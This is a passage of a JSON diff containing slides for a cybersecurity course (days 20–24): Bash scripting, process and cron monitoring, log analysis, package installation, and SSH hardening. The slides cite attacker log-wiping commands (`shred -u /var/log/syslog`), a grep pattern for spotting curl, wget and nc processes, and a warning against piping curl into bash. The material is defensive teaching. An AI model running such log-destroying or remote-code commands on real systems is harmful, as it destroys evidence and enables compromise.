+        "sub": "When you land on a new Linux machine — in a pentest, in an incident response, in a CTF — the first 60 seconds are the same: `whoami` → `id` → `ss -tulnp` → `ps aux` → `ip a`. These 5 commands give you complete situational awareness in under a minute.",
+        "mistake": "Running netcat listeners on production or shared systems. Netcat listeners are legitimate security tools in controlled lab environments only. On a production server, an open netcat listener is a backdoor — immediately report any you discover as a critical security incident."
+      }
+    ]
+  },
+
+  {
+    "day": 20,
+    "cover": {
+      "title": "Bash Scripting __Basics__",
+      "hook": "Automate everything. Bash scripting is the first superpower of security pros.",
+      "tags": ["#Linux", "#BashScripting", "#Day20of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "What is Bash?",
+        "tag": "Foundation",
+        "method": "WHAT — Bash Scripting Explained",
+        "heading": "Bash: __Automate__ Everything",
+        "body": [
+          {"type": "para", "text": "**Bash (Bourne Again Shell)** is the default command-line interpreter on most Linux systems. A Bash script is a plain text file containing Linux commands that execute in sequence — turning manual tasks into automated workflows."},
+          {"type": "para", "text": "**The shebang line** `#!/bin/bash` must be the first line of every script. It tells the system which interpreter to use. Without it, the script may not execute correctly."},
+          {"type": "code", "text": "#!/bin/bash\n# My first security script\necho 'Running security check...'\nwhoami\nip a\nss -tulnp"}
+        ],
+        "pills": [
+          {"text": "Variables", "t": "r"},
+          {"text": "Loops", "t": "y"},
+          {"text": "Functions", "t": "o"}
+        ],
+        "time": "20 min · linuxjourney.com — Bash Scripting Section"
+      },
+      {
+        "type": "red",
+        "label": "Variables & User Input",
+        "tag": "Core Concept",
+        "method": "WHAT — Variables and Input in Bash",
+        "heading": "Variables & __User Input__",
+        "body": [
+          {"type": "code", "text": "#!/bin/bash\nname='Alice'               # Assign variable (no spaces!)"},
+          {"type": "code", "text": "echo \"Hello $name\"         # Access variable with $"},
+          {"type": "code", "text": "read -p 'Enter IP: ' ip    # Prompt user for input"},
+          {"type": "code", "text": "echo \"Scanning $ip...\""},
+          {"type": "code", "text": "result=$(nmap -sV $ip)     # Store command output in variable"},
+          {"type": "code", "text": "echo \"$result\"             # Always quote variables: \"$var\""}
+        ],
+        "time": "20 min · Write and run your first variable script"
+      },
+      {
+        "type": "dark",
+        "label": "Conditionals",
+        "tag": "Logic",
+        "method": "WHAT — if/elif/else in Bash",
+        "heading": "Conditionals: __Make Decisions__",
+        "body": [
+          {"type": "code", "text": "#!/bin/bash\nif [ -f '/etc/passwd' ]; then\n  echo 'passwd file exists'\nelif [ -d '/etc/shadow' ]; then\n  echo 'shadow is a directory?'\nelse\n  echo 'Nothing found'\nfi"},
+          {"type": "para", "text": "**Common test operators:**"},
+          {"type": "code", "text": "-f file   # File exists and is regular file\n-d dir    # Directory exists\n-z \"$var\" # Variable is empty\n-n \"$var\" # Variable is NOT empty\n$a -eq $b # Numbers are equal\n$a -gt $b # Greater than"}
+        ],
+        "time": "20 min · Write a script that checks if a file exists"
+      },
+      {
+        "type": "white",
+        "label": "Loops",
+        "tag": "Automation",
+        "method": "HOW — Automating Repetitive Tasks",
+        "heading": "Loops: __Automate Repetition__",
+        "body": [
+          {"type": "code", "text": "# For loop — iterate over list\nfor ip in 192.168.1.1 192.168.1.2 192.168.1.3; do\n  ping -c 1 $ip && echo \"$ip is UP\"\ndone"},
+          {"type": "code", "text": "# For loop — from file\nfor ip in $(cat targets.txt); do\n  nmap -sV $ip >> results.txt\ndone"},
+          {"type": "code", "text": "# While loop\ncounter=1\nwhile [ $counter -le 5 ]; do\n  echo \"Attempt $counter\"\n  ((counter++))\ndone"}
+        ],
+        "time": "25 min · Write a script that scans a list of IPs"
+      },
+      {
+        "type": "yellow",
+        "label": "What to Learn Today",
+        "tag": "What to Learn",
+        "method": "WHAT — Day 20 Learning Targets",
+        "heading": "Day 20 Checklist",
+        "steps": [
+          "Write a script with **variables and user input** — ask for a name, print a greeting",
+          "Write a script with **an if/else** — check if a file exists, print different messages",
+          "Write a **for loop** that pings 5 IPs and reports UP or DOWN for each",
+          "Make scripts executable with **chmod +x** — run them with `./scriptname.sh`",
+          "Build the **ping checker task** — ask for IP, ping 3 times, report UP or DOWN"
+        ],
+        "time": "Total Day 20 Study Time: 90 – 120 minutes"
+      },
+      {
+        "type": "resources_white",
+        "label": "Where to Learn",
+        "tag": "Free Resources",
+        "method": "WHERE — Best Resources for Day 20",
+        "heading": "Free Resources for __Today__",
+        "resources": [
+          {"label": "📺 Interactive", "name": "LinuxJourney.com — Bash Scripting Section", "url": "linuxjourney.com"},
+          {"label": "📖 Academy", "name": "Bash Academy — Free Comprehensive Bash Guide", "url": "bash.academy"},
+          {"label": "🧪 Lab", "name": "LabEx — Free Bash Scripting Labs", "url": "labex.io/free-labs/linux"},
+          {"label": "📺 Video", "name": "TheNewBoston — Bash Scripting Playlist (YouTube)", "url": "youtube.com/user/thenewboston"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Learn",
+        "method": "HOW — Step-by-Step for Day 20",
+        "heading": "Your Hands-On __Task__ for Day 20",
+        "steps": [
+          "**Write** a Bash script that: asks for an IP, runs `ping -c 3 $ip`, prints 'Host is UP' or 'Host is DOWN'",
+          "**Make** it executable with `chmod +x pingcheck.sh` — run it with `./pingcheck.sh`",
+          "**Extend** it: loop through a file of IPs (`targets.txt`) and check each one automatically",
+          "**Add** the results to a log file with `>>` redirection — timestamp each entry with `date`"
+        ],
+        "time": "Hands-On Task: 60 – 75 minutes"
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 20",
+        "quote": "Every security tool you will ever build starts as a Bash script. The goal is automation. Anything you do 3 or more times manually should become a script.",
+        "sub": "Add `set -e` at the top of every script. It makes the script stop immediately if any command fails — preventing dangerous situations where a failed command causes the rest of the script to run on wrong data. This single line prevents countless real-world automation disasters.",
+        "mistake": "Not quoting variables. Always use `\"$variable\"` not `$variable`. Unquoted variables break when they contain spaces, special characters, or are empty. An unquoted empty variable in an `rm -rf $directory` command could delete unintended files. Quote everything, every time."
+      }
+    ]
+  },
+
+  {
+    "day": 21,
+    "cover": {
+      "title": "Linux Processes & __System Monitoring__",
+      "hook": "Malware hides in processes. Know your system's normal to spot the abnormal.",
+      "tags": ["#Linux", "#ProcessMonitoring", "#Day21of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "Process Basics",
+        "tag": "Foundation",
+        "method": "WHAT — Understanding Linux Processes",
+        "heading": "Processes: __Every Running Program__",
+        "body": [
+          {"type": "para", "text": "Every running program on a Linux system is a **process** with a unique **PID (Process ID)**. Processes have parent-child relationships — every process is spawned by a parent process, tracing back to PID 1 (systemd or init)."},
+          {"type": "code", "text": "ps aux          # All running processes — full details\nps -ef          # Alternative format — shows parent PID\nps aux --sort=-%cpu  # Sort by CPU usage (highest first)\nps aux | grep nginx  # Find specific process by name"}
+        ],
+        "pills": [
+          {"text": "ps aux", "t": "r"},
+          {"text": "htop", "t": "y"},
+          {"text": "cron", "t": "o"}
+        ],
+        "time": "20 min · linuxjourney.com — Process Section"
+      },
+      {
+        "type": "red",
+        "label": "top & htop",
+        "tag": "Real-Time Monitoring",
+        "method": "WHAT — Real-Time Process Monitoring",
+        "heading": "top & htop: __Real-Time__ Process Viewer",
+        "body": [
+          {"type": "para", "text": "**`top`** is a real-time process monitor showing CPU, memory, and process information. Updated every 3 seconds by default. Pre-installed on every Linux system."},
+          {"type": "code", "text": "top              # Launch real-time monitor\n# Inside top:\n# P = sort by CPU usage\n# M = sort by memory usage\n# k = kill a process by PID\n# q = quit"},
+          {"type": "para", "text": "**`htop`** is a colourful, interactive version of top with mouse support. Install with `apt install htop`. Shows process tree, CPU per core, and allows easy process management. **Preferred by security professionals** for incident response."}
+        ],
+        "time": "20 min · Install htop and explore the interface"
+      },
+      {
+        "type": "dark",
+        "label": "Killing Processes",
+        "tag": "Process Control",
+        "method": "HOW — Stopping Malicious Processes",
+        "heading": "Killing Processes: __Stop Malicious Activity__",
+        "body": [
+          {"type": "code", "text": "kill PID           # SIGTERM — ask process to stop gracefully"},
+          {"type": "code", "text": "kill -9 PID        # SIGKILL — force immediate termination"},
+          {"type": "code", "text": "pkill processname  # Kill by process name (not PID)"},
+          {"type": "code", "text": "killall firefox    # Kill ALL processes named firefox"},
+          {"type": "code", "text": "# In incident response:\nps aux | grep malware.sh   # Find malicious process\nkill -9 <PID>              # Immediately terminate it"}
+        ],
+        "note": "**Always try `kill PID` first** (graceful). Only use `kill -9` if the process does not stop — it forces termination without cleanup, which can corrupt files being written.",
+        "time": "15 min · Practice killing and restarting a test process"
+      },
+      {
+        "type": "white",
+        "label": "cron Jobs",
+        "tag": "Persistence Mechanism",
+        "method": "WHAT — Scheduled Tasks and Attacker Persistence",
+        "heading": "cron Jobs: __Scheduled Tasks__ and Persistence",
+        "body": [
+          {"type": "para", "text": "**cron** is the Linux task scheduler — it runs commands automatically at specified times. Format: `minute hour day month weekday command`."},
+          {"type": "code", "text": "crontab -l              # List current user's cron jobs\ncrontab -e              # Edit cron jobs\ncrontab -l -u root      # List root's cron jobs\ncat /etc/crontab        # System-wide cron jobs\nls /etc/cron.d/         # Additional cron job directory"},
+          {"type": "para", "text": "**Attacker persistence:** Malware plants cron jobs to re-execute every few minutes — even after the initial process is killed. `/var/spool/cron/` and `/etc/cron.d/` are the **first places you check** in any Linux incident response."}
+        ],
+        "time": "20 min · TryHackMe Linux room — cron persistence section"
+      },
+      {
+        "type": "yellow",
+        "label": "What to Learn Today",
+        "tag": "What to Learn",
+        "method": "WHAT — Day 21 Learning Targets",
+        "heading": "Day 21 Checklist",
+        "steps": [
+          "Run **`ps aux`** — identify the top 5 processes by CPU and memory usage",
+          "Install **htop** and explore the interface — sort by CPU, then by memory, then kill a test process",
+          "Search for suspicious process names: **`ps aux | grep -E '(curl|wget|nc|bash)' `**",
+          "List **all cron jobs** — user crons, root cron, /etc/crontab, /etc/cron.d — document all",
+          "Understand the **difference between SIGTERM and SIGKILL** — when to use each"
+        ],
+        "time": "Total Day 21 Study Time: 90 – 120 minutes"
+      },
+      {
+        "type": "resources_white",
+        "label": "Where to Learn",
+        "tag": "Free Resources",
+        "method": "WHERE — Best Resources for Day 21",
+        "heading": "Free Resources for __Today__",
+        "resources": [
+          {"label": "📺 Interactive", "name": "LinuxJourney.com — Process Section", "url": "linuxjourney.com"},
+          {"label": "🧪 Lab", "name": "LabEx — Linux Process Management Labs (free)", "url": "labex.io/free-labs/linux"},
+          {"label": "🧪 Lab", "name": "TryHackMe — 'Linux Fundamentals Part 3' (free)", "url": "tryhackme.com/room/linuxfundamentalspart3"},
+          {"label": "📖 Reference", "name": "CronGuru — Cron Expression Visualiser (free)", "url": "crontab.guru"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Learn",
+        "method": "HOW — Step-by-Step for Day 21",
+        "heading": "Your Hands-On __Task__ for Day 21",
+        "steps": [
+          "**Run** `ps aux | grep -E '(curl|wget|nc|bash)'` — document any suspicious processes found",
+          "**Install** htop with `sudo apt install htop` — explore sorting, tree view, and process killing",
+          "**Check all cron locations:** `crontab -l`, `sudo crontab -l`, `cat /etc/crontab`, `ls /etc/cron.d/`",
+          "**Create a test cron job** that echoes a message every minute — verify it runs, then delete it"
+        ],
+        "time": "Hands-On Task: 60 – 75 minutes"
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 21",
+        "quote": "In incident response, `ps aux` and `crontab -l` are among the first commands to run. Persistence mechanisms hide in cron jobs — an attacker who plants a cron job survives reboots and process kills.",
+        "sub": "Baseline your system's normal process list today by saving `ps aux` output to a file. In any future incident, diff the current process list against this baseline — any new process that wasn't running before is immediately suspicious and worth investigating.",
+        "mistake": "Using `kill -9` as the first option. SIGKILL forces immediate termination without cleanup. If a malicious process was writing logs or encrypting files, kill -9 may corrupt evidence needed for forensics. Always try SIGTERM first, document the process details, then escalate to SIGKILL if necessary."
+      }
+    ]
+  },
+
+  {
+    "day": 22,
+    "cover": {
+      "title": "Linux __Log Analysis__",
+      "hook": "Logs don't lie. Every attack leaves traces. Know where to look.",
+      "tags": ["#Linux", "#LogAnalysis", "#Day22of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "Key Log Locations",
+        "tag": "Foundation",
+        "method": "WHAT — Where Logs Live on Linux",
+        "heading": "Critical __Log Files__ Every Analyst Knows",
+        "body": [
+          {"type": "code", "text": "/var/log/syslog         # General system events (Debian/Ubuntu)"},
+          {"type": "code", "text": "/var/log/auth.log       # Authentication — logins, sudo, SSH"},
+          {"type": "code", "text": "/var/log/kern.log       # Kernel messages — hardware, drivers"},
+          {"type": "code", "text": "/var/log/apache2/access.log  # Web server requests"},
+          {"type": "code", "text": "/var/log/apache2/error.log   # Web server errors"},
+          {"type": "code", "text": "/var/log/messages       # General system (RHEL/CentOS)"},
+          {"type": "code", "text": "/var/log/secure         # Auth log on RHEL/CentOS systems"}
+        ],
+        "pills": [
+          {"text": "auth.log", "t": "r"},
+          {"text": "journalctl", "t": "y"},
+          {"text": "SIEM", "t": "o"}
+        ],
+        "time": "20 min · LabEx Linux Labs · linuxjourney.com"
+      },
+      {
+        "type": "red",
+        "label": "journalctl",
+        "tag": "Modern Log Viewer",
+        "method": "WHAT — systemd Journal Queries",
+        "heading": "journalctl: __Modern Log Querying__",
+        "body": [
+          {"type": "code", "text": "journalctl                         # All logs (oldest first)"},
+          {"type": "code", "text": "journalctl -f                      # Follow live — like tail -f"},
+          {"type": "code", "text": "journalctl -u ssh                  # Logs for SSH service only"},
+          {"type": "code", "text": "journalctl -u apache2 --since today # Today's web server logs"},
+          {"type": "code", "text": "journalctl --since '1 hour ago'    # Last hour of all logs"},
+          {"type": "code", "text": "journalctl -p err                  # Error priority and above only"},
+          {"type": "code", "text": "journalctl -b                      # Logs since last boot"}
+        ],
+        "time": "20 min · Practice journalctl queries on your Linux system"
+      },
+      {
+        "type": "dark",
+        "label": "Brute Force Detection",
+        "tag": "SOC Technique",
+        "method": "HOW — Detecting SSH Brute Force in Logs",
+        "heading": "Detecting __Brute Force__ in auth.log",
+        "body": [
+          {"type": "code", "text": "# Count total failed login attempts:\ngrep -c 'Failed password' /var/log/auth.log"},
+          {"type": "code", "text": "# Top attacking IP addresses:\ngrep 'Failed password' /var/log/auth.log \\\n  | awk '{print $11}' \\\n  | sort | uniq -c \\\n  | sort -rn | head -20"},
+          {"type": "code", "text": "# Find successful logins (verify these are legitimate):\ngrep 'Accepted password\\|Accepted publickey' /var/log/auth.log"},
+          {"type": "code", "text": "# Find new user accounts created (persistence check):\ngrep 'useradd\\|adduser' /var/log/auth.log"}
+        ],
+        "time": "30 min · Run all 4 commands against your auth.log"
+      },
+      {
+        "type": "white",
+        "label": "Log Rotation & Clearing",
+        "tag": "Forensics Awareness",
+        "method": "WHAT — Log Management and Attack Evidence",
+        "heading": "Log Rotation & __Missing Logs = Evidence__",
+        "body": [
+          {"type": "para", "text": "**Log rotation** (`logrotate`) prevents logs from consuming all disk space by compressing and archiving old log files. Configuration lives in `/etc/logrotate.conf` and `/etc/logrotate.d/`."},
+          {"type": "para", "text": "**Attackers clear logs to cover their tracks.** Common techniques: `echo '' > /var/log/auth.log`, `shred -u /var/log/syslog`, or modifying log entries directly. Missing or empty logs are themselves evidence of compromise."},
+          {"type": "para", "text": "**In enterprise environments**, logs are shipped to a centralised SIEM (Splunk, ELK Stack, Microsoft Sentinel) immediately. Even if an attacker clears local logs, the SIEM already has copies. **Local log clearing is detectable** because the SIEM sees a sudden stop in log events."}
+        ],
+        "time": "20 min · Check your logrotate config: cat /etc/logrotate.conf"
+      },
+      {
+        "type": "yellow",
+        "label": "What to Learn Today",
+        "tag": "What to Learn",
+        "method": "WHAT — Day 22 Learning Targets",
+        "heading": "Day 22 Checklist",
+        "steps": [
+          "Memorise the **7 critical log file locations** — what each contains and when to check it",
+          "Use **journalctl** to filter by service (`-u ssh`), time (`--since`), and priority (`-p err`)",
+          "Run the **brute force detection one-liner** — how many failed logins has your system seen?",
+          "Check for **successful logins** in auth.log — verify every accepted connection is legitimate",
+          "Understand **why missing logs are evidence** — explain the SIEM forwarding defence"
+        ],
+        "time": "Total Day 22 Study Time: 90 – 120 minutes"
+      },
+      {
+        "type": "resources_white",
+        "label": "Where to Learn",
+        "tag": "Free Resources",
+        "method": "WHERE — Best Resources for Day 22",
+        "heading": "Free Resources for __Today__",
+        "resources": [
+          {"label": "🧪 Lab", "name": "LabEx — Linux Log Analysis Labs (free)", "url": "labex.io/free-labs/linux"},
+          {"label": "🧪 Lab", "name": "TryHackMe — 'Linux Forensics' Room (free)", "url": "tryhackme.com/room/linuxforensics"},
+          {"label": "🎓 Training", "name": "Splunk Free Training — Intro to Splunk", "url": "splunk.com/en_us/training"},
+          {"label": "🧪 Path", "name": "TryHackMe — SOC Level 1 Path (free)", "url": "tryhackme.com/path/outline/soclevel1"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Learn",
+        "method": "HOW — Step-by-Step for Day 22",
+        "heading": "Your Hands-On __Task__ for Day 22",
+        "steps": [
+          "**Count** total failed logins: `grep -c 'Failed' /var/log/auth.log` — is your system being attacked?",
+          "**Run** the brute force detection one-liner — document the top 5 attacking IPs",
+          "**Use** journalctl to check SSH logs: `journalctl -u ssh --since '24 hours ago'`",
+          "**Check** if your auth.log is empty — if so, investigate why (cleared logs = major red flag)"
+        ],
+        "time": "Hands-On Task: 60 – 75 minutes"
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 22",
+        "quote": "Log analysis is 50% of a SOC analyst's daily work. Build a personal library of analysis one-liners — every query you write today becomes a tool you reuse for the rest of your career.",
+        "sub": "The most important log analysis habit: always check for successful logins AFTER suspicious failed logins. An attacker who tried 10,000 times and succeeded once will appear in both the failed password list AND the accepted connections list. Finding that successful login is the critical discovery.",
+        "mistake": "Alerting only when auth.log has high activity. An empty or suddenly silent auth.log after normal activity is equally suspicious — it may mean the file was cleared. Set alerts for BOTH excessive activity AND sudden silence. Both are red flags."
+      }
+    ]
+  },
+
+  {
+    "day": 23,
+    "cover": {
+      "title": "Package Management & __Software Installation__",
+      "hook": "Install any security tool in seconds. Linux package management explained.",
+      "tags": ["#Linux", "#PackageManagement", "#Day23of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "apt — Debian/Ubuntu",
+        "tag": "Foundation",
+        "method": "WHAT — apt Package Manager",
+        "heading": "apt: __Install Anything__ Instantly",
+        "body": [
+          {"type": "code", "text": "apt update                  # Refresh package list from repos"},
+          {"type": "code", "text": "apt upgrade                 # Upgrade all installed packages"},
+          {"type": "code", "text": "apt install nmap            # Install a package"},
+          {"type": "code", "text": "apt install nmap wireshark  # Install multiple packages"},
+          {"type": "code", "text": "apt remove nmap             # Uninstall package (keep config)"},
+          {"type": "code", "text": "apt purge nmap              # Uninstall + delete config files"},
+          {"type": "code", "text": "apt search 'port scanner'   # Search for packages by keyword"},
+          {"type": "code", "text": "apt list --installed        # List all installed packages"}
+        ],
+        "pills": [
+          {"text": "apt", "t": "r"},
+          {"text": "yum/dnf", "t": "y"},
+          {"text": "pip", "t": "o"}
+        ],
+        "time": "20 min · linuxjourney.com · Cisco Linux Unhatched"
+      },
+      {
+        "type": "red",
+        "label": "yum/dnf — RHEL/CentOS",
+        "tag": "Enterprise Linux",
+        "method": "WHAT — Red Hat Package Managers",
+        "heading": "yum & dnf: __Enterprise Linux__ Packages",
+        "body": [
+          {"type": "code", "text": "yum install nmap          # Install on CentOS/RHEL 7"},
+          {"type": "code", "text": "dnf install nmap          # Install on Fedora/RHEL 8+"},
+          {"type": "code", "text": "yum update                # Update all packages"},
+          {"type": "code", "text": "rpm -qa                   # List all installed RPM packages"},
+          {"type": "code", "text": "rpm -qi nmap              # Show info about installed package"},
+          {"type": "para", "text": "**Why this matters:** Enterprise SOC environments, cloud servers, and critical infrastructure predominantly run RHEL or CentOS. If your job is defending enterprise Linux, yum/dnf is your package manager. CompTIA Linux+ tests both apt and yum."}
+        ],
+        "time": "15 min · Practice on a CentOS VM or TryHackMe RHEL room"
+      },
+      {
+        "type": "dark",
+        "label": "Installing from Source & pip",
+        "tag": "Advanced Installation",
+        "method": "HOW — Installing Tools Not in Repos",
+        "heading": "Source & __pip__: When Repos Fall Short",
+        "body": [
+          {"type": "code", "text": "# Installing from source code:\ngit clone https://github.com/tool/repo\ncd repo\n./configure\nmake\nsudo make install"},
+          {"type": "code", "text": "# Python tools with pip:\npip3 install requests          # Install Python library\npip3 install impacket          # Install Impacket (pentest tool)\npip3 install -r requirements.txt  # Install from requirements file"},
+          {"type": "para", "text": "**Security warning:** Never run `curl https://unknown-site.com/install.sh | bash`. This executes arbitrary code from the internet without reviewing it. Always download the script first, read it, then execute it from your local copy."}
+        ],
+        "time": "20 min · Install a Python security tool via pip"
+      },
+      {
+        "type": "white",
+        "label": "Kali Security Toolkit",
+        "tag": "Kali Linux",
+        "method": "WHAT — Kali's Pre-installed Arsenal",
+        "heading": "Kali Linux: __600+ Tools__ Pre-installed",
+        "steps": [
+          "**nmap** — network discovery and port scanning (already installed on Kali)",
+          "**metasploit-framework** — exploitation framework with 2,300+ modules",
+          "**wireshark** — GUI network packet analyser — see all traffic in real-time",
+          "**burpsuite** — web application testing proxy — intercept and modify HTTP",
+          "**hydra** — online password brute-forcing for SSH, FTP, HTTP, RDP",
+          "**gobuster** — web directory and DNS subdomain brute-force enumeration"
+        ],
+        "time": "30 min · Install 5 security tools and verify each with --version"
+      },
+      {
+        "type": "yellow",
+        "label": "What to Learn Today",
+        "tag": "What to Learn",
+        "method": "WHAT — Day 23 Learning Targets",
+        "heading": "Day 23 Checklist",
+        "steps": [
+          "Run **`apt update && apt upgrade`** — understand why updating before installing matters",
+          "**Install 5 security tools:** `sudo apt install nmap netcat wireshark hydra gobuster`",
+          "Verify each installation with **`tool --version`** — all should return version information",
+          "Understand the difference between **apt remove and apt purge** — when to use each",
+          "Know why **`curl | bash`** is dangerous — explain the risk in your own words"
+        ],
+        "time": "Total Day 23 Study Time: 90 – 120 minutes"
+      },
+      {
+        "type": "resources_white",
+        "label": "Where to Learn",
+        "tag": "Free Resources",
+        "method": "WHERE — Best Resources for Day 23",
+        "heading": "Free Resources for __Today__",
+        "resources": [
+          {"label": "📖 Course", "name": "Cisco NetAcad — Linux Unhatched (free)", "url": "netacad.com/courses/linux-unhatched"},
+          {"label": "📚 Docs", "name": "Kali Linux — Official Tool Documentation", "url": "kali.org/docs/tools"},
+          {"label": "🧪 Lab", "name": "LabEx — Linux Package Management Labs (free)", "url": "labex.io/free-labs/linux"},
+          {"label": "📺 Interactive", "name": "LinuxJourney.com — Package Management Section", "url": "linuxjourney.com"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Learn",
+        "method": "HOW — Step-by-Step for Day 23",
+        "heading": "Your Hands-On __Task__ for Day 23",
+        "steps": [
+          "**Run** `sudo apt update` then `sudo apt install nmap netcat wireshark hydra gobuster`",
+          "**Verify** each installation: `nmap --version`, `nc --version`, `hydra --version`, `gobuster version`",
+          "**List** all installed packages: `apt list --installed | wc -l` — how many packages are on your system?",
+          "**Research** 3 more tools you want to install — find their apt package names with `apt search`"
+        ],
+        "time": "Hands-On Task: 45 – 60 minutes"
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 23",
+        "quote": "Always run `apt update` before `apt install`. Stale package lists result in installing outdated versions — which may have known security vulnerabilities or missing features.",
+        "sub": "For Python-based security tools, always check if they need a specific Python version. Create virtual environments with `python3 -m venv venv` and `source venv/bin/activate` to isolate tool dependencies. This prevents conflicts between tools that need different library versions.",
+        "mistake": "Running `curl https://random-site.com/install.sh | bash`. This pipes a script from the internet directly into your shell without reviewing it. Even if the site looks legitimate, this is how supply chain attacks work. Download → inspect → execute. Never skip the inspect step."
+      }
+    ]
+  },
+
+  {
+    "day": 24,
+    "cover": {
+      "title": "SSH & __Remote Access Security__",
+      "hook": "SSH is the most attacked service on the internet. Master it AND secure it.",
+      "tags": ["#Linux", "#SSH", "#Day24of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "SSH Basics",
+        "tag": "Foundation",
+        "method": "WHAT — How SSH Works",
+        "heading": "SSH: __Secure Remote Access__",
+        "body": [
+          {"type": "code", "text": "ssh user@192.168.1.10         # Basic SSH connection"},
+          {"type": "code", "text": "ssh -p 2222 user@host         # Connect on custom port"},
+          {"type": "code", "text": "ssh -i ~/.ssh/mykey user@host # Connect with private key"},
+          {"type": "code", "text": "ssh -L 8080:localhost:80 user@host  # Local port forward"},
+          {"type": "code", "text": "ssh -v user@host              # Verbose — debug connection issues"}
+        ],
+        "note": "**Port 22 is the first port attackers scan.** Any internet-facing server on default port 22 with password authentication will receive thousands of brute-force attempts within hours of being deployed. Hardening SSH is non-negotiable.",
+        "pills": [
+          {"text": "SSH Keys", "t": "r"},
+          {"text": "fail2ban", "t": "y"},
+          {"text": "sshd_config", "t": "o"}
+        ],
+        "time": "20 min · LabEx Linux Labs · linuxjourney.com"
+      },
+      {
+        "type": "red",
+        "label": "SSH Key Authentication",
+        "tag": "Security Best Practice",
+        "method": "HOW — Setting Up Key-Based Auth",
+        "heading": "SSH Keys: __Far More Secure__ Than Passwords",
+        "body": [
+          {"type": "code", "text": "# Generate Ed25519 keypair (recommended — strongest):\nssh-keygen -t ed25519 -C 'your@email.com'"},
+          {"type": "code", "text": "# Deploy public key to server:\nssh-copy-id user@server"},
+          {"type": "code", "text": "# Manual method (if ssh-copy-id unavailable):\ncat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys"},
+          {"type": "para", "text": "**The golden rule:** Your **private key** (`id_ed25519`) NEVER leaves your machine. Ever. The **public key** (`id_ed25519.pub`) is what you share with servers. If your private key is stolen, an attacker has access to every server that trusts it."}
+        ],
+        "time": "25 min · Generate a keypair and deploy it to a test server"
+      },
+      {
+        "type": "dark",
+        "label": "Hardening SSH",
+        "tag": "Security Configuration",
+        "method": "HOW — Securing sshd_config",
+        "heading": "Hardening __sshd_config__: Lock It Down",
+        "body": [
+          {"type": "code", "text": "# Edit /etc/ssh/sshd_config:\nPermitRootLogin no          # Never allow direct root login"},
+          {"type": "code", "text": "PasswordAuthentication no   # Require key-based auth only"},
+          {"type": "code", "text": "Port 2222                   # Change from default port 22"},
+          {"type": "code", "text": "AllowUsers alice bob        # Whitelist allowed usernames"},
+          {"type": "code", "text": "MaxAuthTries 3              # Limit login attempts per connection"},
+          {"type": "code", "text": "ClientAliveInterval 300     # Disconnect idle sessions (5 min)"},
+          {"type": "code", "text": "# Apply changes:\nsudo systemctl restart sshd"}
+        ],
+        "time": "25 min · Apply all hardening settings to your SSH lab VM"
+      },
+      {
+        "type": "white",
+        "label": "fail2ban & SCP",
+        "tag": "Additional Controls",
+        "method": "WHAT — Automated Protection and Secure Transfer",
+        "heading": "fail2ban & __Secure File Transfer__",
+        "body": [
+          {"type": "para", "text": "**fail2ban** automatically bans IP addresses that repeatedly fail authentication. Install: `sudo apt install fail2ban`. Default config: ban after 5 failed attempts for 10 minutes. **Essential for any internet-facing server.**"},
+          {"type": "code", "text": "systemctl status fail2ban          # Verify it's running\nfail2ban-client status sshd        # See banned IPs for SSH\nfail2ban-client set sshd unbanip IP # Unban legitimate user"},
+          {"type": "para", "text": "**SCP (Secure Copy):** Transfer files securely over SSH. Replaces FTP entirely."},
+          {"type": "code", "text": "scp file.txt user@host:/remote/path  # Upload file\nscp user@host:/remote/file.txt .    # Download file\nscp -r directory/ user@host:/path   # Copy entire directory"}
+        ],
+        "time": "20 min · Install and verify fail2ban on your Linux VM"
+      },
+      {
+        "type": "yellow",
+        "label": "What to Learn Today",
+        "tag": "What to Learn",
+        "method": "WHAT — Day 24 Learning Targets",
+        "heading": "Day 24 Checklist",
+        "steps": [
+          "Generate an **Ed25519 SSH keypair** — understand why Ed25519 is preferred over RSA",
+          "Deploy the **public key** to a test server — connect without using a password",
+          "Apply **5 hardening settings** to sshd_config — disable root login, disable password auth",
+          "Install **fail2ban** and verify it is running with `systemctl status fail2ban`",
+          "Transfer a file with **SCP** — both upload and download directions"
+        ],
+        "time": "Total Day 24 Study Time: 90 – 120 minutes"
+      },
+      {
+        "type": "resources_white",
+        "label": "Where to Learn",
+        "tag": "Free Resources",
+        "method": "WHERE — Best Resources for Day 24",
+        "heading": "Free Resources for __Today__",
+        "resources": [
+          {"label": "🧪 Lab", "name": "LabEx — SSH Security Labs (free browser-based)", "url": "labex.io/free-labs/linux"},
+          {"label": "📖 Academy", "name": "SSH Academy — Free SSH Configuration Guides", "url": "ssh.com/academy"},
+          {"label": "📖 Docs", "name": "fail2ban Official Documentation", "url": "fail2ban.org"},
+          {"label": "🧪 Lab", "name": "TryHackMe — 'SSH' Room (free)", "url": "tryhackme.com/room/sshkeysandagents"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Learn",
+        "method": "HOW — Step-by-Step for Day 24",
+        "heading": "Your Hands-On __Task__ for Day 24",
+        "steps": [
+          "**Generate** an Ed25519 keypair: `ssh-keygen -t ed25519` — examine both files it creates",
+          "**Harden** your VM's sshd_config: disable root login, disable password auth, restart sshd",
+          "**Install** fail2ban: `sudo apt install fail2ban` — verify it is active and protecting SSH",
+          "**Transfer** a file to and from your VM using SCP — verify the file contents match"
+        ],
+        "time": "Hands-On Task: 60 – 75 minutes"
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 24",
